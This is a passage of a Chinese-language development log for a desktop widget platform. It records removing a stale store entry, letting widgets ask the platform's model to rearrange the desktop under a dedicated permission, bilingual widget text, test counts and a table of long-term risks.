  - **"Now Playing" 是商店目录里的幽灵，不是仓库里的组件**：用户看到的"可装 1"那一条来自线上 `registry.json`（`lattice.media`，v0.9 改名成 `lattice.music` 之前的旧 id），它的家在姊妹仓库 `lattice-registry`，这个仓库早就没有它的目录。修法在那边：`git rm` 掉 `packages/lattice.media-0.1.0.*` 与 `icons/lattice.media.svg`，跑 `node scripts/build.mjs`（5 个组件），推上去等 Pages 重建。**教训**：改名时只改了本仓库的包名，没管已经发布出去的旧条目 —— 目录是另一份事实，它有自己的一份家。
  - **索引是生成的，要重跑**：`public/widgets/index.json`（`npm run widgets:index`）和内置商店目录（`npm run store:index`）都不是手写的，仓库里少一个包它们不会自己知道。
  - **文档里"拿示例当事实"的句子会变成死链**：README 说"`lattice.agent` 是读的那一侧"、ROADMAP 的 v0.8 行写着"一块看板组件"、AGENT_ACCESS 的 C 那一行标 `[已实现]` —— 组件一删，这些句子就从陈述变成了指向空目录的指针。改成陈述能力本身（谁都能用），别改成"曾经有个组件"。
  - **用户的 `state.json` 里会留一条找不到的 id**：`installedIds` 有 `lattice.agent`，包没了它就变成"加载失败"的一条。这个平台没有 id 迁移机制，也没有"官方撤包"的通道（v0.9 改名那次就是同一个坑），只能在装机现场手工摘掉 —— 记在这里，是因为下一次删官方组件还会撞上。
  - **断言总数与页面数要跟着改**：一页 57 条一起消失，规模表里那两格（这次重新数成 1606 条 / 40 页）不重跑一遍就是假的。
- [x] **组件能借平台的手（`desktop:control` / `assistant.ask`）**。用户原话："我想要我的大肥鱼小组件可以调控其他组件。能行吗，还有就是大肥鱼通过对话调动平台模型，模型来操控。" 这正是 v0.10 前面那条"组件只有嘴"留下的口子 —— 桌宠会说话，但她说"我把时钟挪过去"只能是假的。三条路里选了**最窄的一条**：
  - **只走模型**（用户选的）：不给组件 OPEN 一条直连执行器的路，而是在桥上开 `assistant.ask` —— 平台**替**它跑一整轮（`runWidgetTurn`：同一个 `systemPrompt`、同一份快照、同一个 ≤6 步循环、同一个执行器），组件只拿回 `{ text, actions }`。另一条被否掉的是"给组件一条自己的动作接口"，理由是那不变量 2 的反面：**能改变桌面的逻辑只活在主窗口里**，桌面宿主连 store 都没有。
  - **不能删**（用户选的）：`toolsFor("widget")` 从工具表里摘掉 `placement.remove`，系统提示另加一句"这一轮你没有删除组件的工具，让用户自己按 ✕"。理由：删 placement 是不可撤销的（`removePlacement` 的 8 秒 `Undo` 只在 UI 上），而"桌宠听错一句话"太容易发生了；能加能挪能改主题，已经够她干活。
  - **权限单列**：第十一项 `desktop:control`（"Rearrange my desktop"），不是并进 `llm:chat`。并进去的话，用户装一块会聊天的桌宠就得连带同意"它还能挪我的时钟" —— 授权面板上一行字不该替用户做这个决定（和 `audio:level` 不并进 `media:control` 是同一条理由）。
  - **`system` 位置只当人设**：组件可以把 `{ role: "system" }` 放最前面写角色，平台把它当**人设片段**塞在规则**之后**、快照**之前**，截 1200 字。写在后面的东西不改前面的规则 —— 这是顺序，不是礼貌。`normalizeAskMessages` 钉住形状（16 条 / 单条 4000 / 合计 16000、role 只认三个、最多一个 system 且必须在最前、最后一条必须是 user）。
  - **一轮只能有一条，超时 180 秒**：同一窗口上一轮没回来时新的直接拒（"a turn is already running"），不排队 —— 两轮并发改同一份布局，结果一定有一半是错的。`agent.rs` 加 `ASK_TIMEOUT`（`call_frontend` 拆出 `call_frontend_within`），因为一轮最多 6 次模型往返，8 秒的默认值会把正常的一轮砍断；SDK 那侧同样给这一条单独 185 秒（`call` 加了 `options.timeout`），默认 3 秒会先把组件坑掉。审计写 `widget.ask`，只记组件 id 与字数。
  - **组件那条路仍然是"转发"**：`assistant_ask` 只把 `{op:"ask"}` 投给主窗口，真正的循环跑在 `App.tsx` 的 `askFromWidget` 里（`startAgentBridge` 新开了 `ask` 这一个 handler，agent 端点的 8 个动作一个没动）。加新动作两边都不用改。
  - **`messages` 在线上是文本，不是数组** —— 这一版唯一真机上撞到的坑。桥 `JSON.stringify` 了一次（Rust 那条命令的参数类型是 `String`，它只负责转发，没理由在 Rust 里重新认识一遍对话的形状），所以主窗口收到的是字符串；第一版把它直接丢给 `normalizeAskMessages`，症状是**每一轮都失败**、错误写着 `"messages" must be an array of {role, content}` —— 看着像组件传错了，其实错在中间这一跳。修法是 `parseAskMessages`，就放在 `normalizeAskMessages` 旁边（线上格式和形状校验是同一件事的两半，分开写迟早有一边忘了改），`tests/assistant.html` 补了 4 条。**教训**：单元测试只覆盖了纯函数（数组进、数组出），"线上格式"是另一层事实 —— 那条路要么有集成断言，要么就得真机跑一遍。
- [x] **官方组件全部双语**。用户原话："中英文的翻译适配还是没做好，我使用中文时小组件里有英文，右侧属性里也有怎么用是英文。" 平台自己那套文案（`runtime/i18n/*`，英文原句当 key）早就两门了，漏的是**作者写的那一层**：14 个内置组件的清单里只有英文字符串，卡片里画出去的字也从不问"现在是哪一门" —— 于是中文界面上，属性面板的"怎么用"、配置项标签、卡片里的星期 / 计数 / 按钮全是英文。修法就是 §2.7 早就定好的两条：清单字段写 `{ zh, en }`（`pickText` 按界面语言挑），卡片里 `call("lang.get")` 拿初值 + 收 `language` 推送重画。三条不肯让步的：
  - **写死的首帧是中文**：英文界面上会有一帧中文（几十毫秒），换来的是不用先画"加载中"占位（不变量 18）。反过来写只是把这一帧换个方向 —— 这个产品的主要语言是中文，`lattice.pet` 当初就是这个选择。
  - **`lang.get` 不进首屏那条链**：问语言慢一拍不该拖住第一帧，它自己一条 `call(...).then(applyLanguage)`。
  - **闸门而不是文档**：`tests/help.html` 新的一段核对"清单该双语的字段两门齐全 + 组件源码里既有 `lang.get` 也有 `language` 推送"。14 个组件、几十个字段，靠人眼记必漏，而且漏一半的症状很隐蔽（只听推送的，热重载之后就停在旧语言）。
  - 每个组件都抬了一个 patch 位（`0.2.0 → 0.2.1` 这种）并在 changelog 最前面补一条双语记录 —— 它是包的一部分，改了却不抬版本，商店里那个条目永远显示"已是最新"。
  - 验证：`tests/help.html` **33 条**（新增的第 5 段钉两件事：清单里该双语的字段两门齐全；每个组件的源码里既有 `lang.get` 也有 `language` 推送），14 个组件的测试页各自补了中文断言（课程表 152、天气 108、日历 97、音乐 71、系统 63、秒表 60、专注 59、换算 55、书签 48、计算器 46、待办 29、便签 11 + 10），`npm run typecheck` 干净、`npm run test:sdk` 干净、全量自检 **40 页 / 1709 条 / 0 failed**（比上一版 +66 条）。真机两处都点过：设置里选中文之后，组件库卡片上那颗 `?` 的标题是「收藏夹 怎么用」、正文六节全中文；右侧属性面板的「怎么用」、配置项标签与选项、权限名也全中文 —— 再切英文，整份换回去。`npm run store:index` 重新打了 15 个包，`registry.json` 里 `name` / `description` 现在都带 `zh`（商店区读的就是这一份，不重打就还是英文名）。
- 验证：`llm_policy.rs` **21 条** `rustc --test`（归一化、回环、请求体、消息与工具校验、应答解析、401/404/429 的话）、`tests/assistant.html` **114 条**、`tests/i18n.html` **50 条**、`tests/widget-text.html` **40 条**（新增：两门归一化、按门截断、缺一门退另一门、搜索索引），`tests/help.html` / `config.html` / `catalogue.html` / `library-search.html` / `sdk.html`（**47 条**，新增 `assistant.ask` 的参数形状与它自己那条超时）各补了双语与 `lang.get` 的断言；`npm run typecheck` 干净、`npm run test:sdk` 干净（内嵌 SDK 副本已同步）、全量自检 **40 页 / 1643 条 / 0 failed**（比上一版少一页 57 条 —— 看板组件删了）。真机走过三条：先是假端点（卡片从 (32,40) 挪到 (300,120)、错的 key 得到那句 401），再是**真厂商** —— 天枢 Dubhe 的 OpenAI 兼容根是 `…/v1/8686/v1`（`/v1/8686` 本身返回一张 HTML SPA，少写那截 `/v1` 会得到 404 而不是"地址不对"）：列出 4 个模型、`finish_reason: "tool_calls"` 的往返、`role: "tool"` 回填都被接受；第三条是**组件借手那条路**：给桌宠勾上「替我调整桌面」后，主窗口里打一轮"把 lattice.pet#49898d37 挪到 700, 240 并置顶"，`actions` 两条 `ok`、盘上那只真的到了 `(700,240)`、审计里 `widget.ask` 加每一步的 `assistant.chat`；再问"把 lattice.pet#demo01 删掉"，她回"我删不了自己呀，手里没有删除工具"，`actions: []`、`placements` 一个字没动；最后在画布上的桌宠气泡里真打一句"把 lattice.pet#9c90cc09 挪到 900, 100"，气泡里出现回话加"· 移动 lattice.pet#9c90cc09"，盘上那只到了 `900,100`。中英切换在真机上也点过一遍（设置里三档来回点：`<html lang>` 跟着变、菜单整份换语言、切回"跟随系统"后按 WebView2 报的 `en-US` 落回英文）。**没走的**："断网时那句话对不对"（要拔网线），以及 agent 端点的 CLI 往返（见 §8 已知缺口）。

## 长期要盯的风险

| 风险              | 说明                                                |
| --------------- | ------------------------------------------------- |
| **安全**          | 第三方组件是任意代码。沙箱 + 权限清单只是第一层，还要 CSP 锁定、网络白名单、签名校验    |
| **性能**          | 组件数量上去后，WebView 数量是内存杀手。需要考虑同一 WebView 内多组件，或空闲卸载 |
| **WorkerW 兼容性** | 挂桌面依赖未公开行为，Windows 大版本更新可能变。要有降级路径                |
| **组件生态冷启动**     | 平台价值取决于组件数量，早期需要官方做足够多高质量组件 —— 但更缺的是"目录能被填上"这件事，见 v0.6 |
| **agent 端点**     | 令牌在 `%APPDATA%` 下，**同账户的任何进程都读得到** —— 桌面应用做不到进程级隔离。挡的是别的用户和网络，挡不住你自己账户里跑的程序。防线不是密码学，是默认关 + 8 个白名单动作 + 审计日志 + 危险动作根本不在表里 |
| **幽灵关闭**         | 有一类"没人碰鼠标却关掉了组件"的 `widget_close`，带着完整的指针特征（`isTrusted` / `detail: 1` / `pointer: mouse`），落点在 ✕ 中心。门已经收窄（`close-guard.ts`：没有 `pointerdown` 不认、坐标不在按钮上不认），但**根因没找到**，而判断对"一段完整的按下 + 松开"无能为力。下次复现先看日志里的 `why=`：`ok` 说明是真序列，那问题就在输入本身（延迟投递 / 重放），不在宿主页 |
